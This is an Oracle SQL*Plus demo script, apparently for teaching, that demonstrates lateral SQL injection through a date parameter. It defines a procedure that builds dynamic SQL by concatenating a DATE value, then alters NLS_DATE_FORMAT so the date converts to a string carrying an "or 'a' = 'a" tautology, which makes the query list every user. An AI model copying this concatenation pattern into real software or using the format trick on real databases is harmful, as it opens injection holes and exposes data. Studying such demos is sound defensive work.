connect /
set echo on
clear screen
create or replace procedure inj( p_date in date )
as
	l_rec   all_users%rowtype;
	c       sys_refcursor;
	l_query long;
begin
	l_query := '
	select * 
	  from all_users 
	 where created = ''' ||p_date ||'''';

	dbms_output.put_line( l_query );
	open c for l_query;

	for i in 1 .. 5
	loop
		fetch c into l_rec;
		exit when c%notfound;
		dbms_output.put_line( l_rec.username || '.....' );
	end loop;
	close c;
end;
/
pause
clear screen
exec inj( sysdate )
pause
clear screen
alter session set 
nls_date_format = 'dd-mon-yyyy"'' or ''a'' = ''a"';
pause
exec inj( sysdate )
pause
connect /
clear screen
